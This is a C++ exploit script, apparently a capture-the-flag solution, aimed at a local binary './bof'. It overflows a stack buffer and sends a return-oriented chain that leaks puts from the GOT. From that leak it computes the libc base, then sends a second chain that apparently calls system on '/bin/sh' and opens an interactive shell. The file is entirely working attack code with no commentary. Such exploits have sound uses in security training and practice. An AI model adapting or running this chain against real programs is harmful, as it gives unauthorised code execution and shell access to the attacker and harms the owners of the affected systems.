#include <string>
#include <iostream>
#include <pwntools>

int main(void) {
    Process io("./bof");
    std::string payload;
    payload.resize(0x18);
    io.recvline();

    payload += pack::p64(0x401263);
    payload += pack::p64(0x404018);
    payload += pack::p64(0x401060);
    payload += pack::p64(0x401176);

    io.sendline(payload);
    std::string _leak = io.recv(6);
    _leak.resize(8);
    uint64_t leak = pack::u64(_leak);

    printf("puts leak: %p\n", (void *)leak);
    leak -= 0x875a0;
    printf("libc leak: %p\n", (void *)leak);
    io.recvline();
    
    payload.resize(0x18);
    payload += pack::p64(0x401264);
    payload += pack::p64(0x401263);
    payload += pack::p64(leak + 0x1b75aa);
    payload += pack::p64(leak + 0x55410);
    io.sendline(payload);

    io.interactive();
}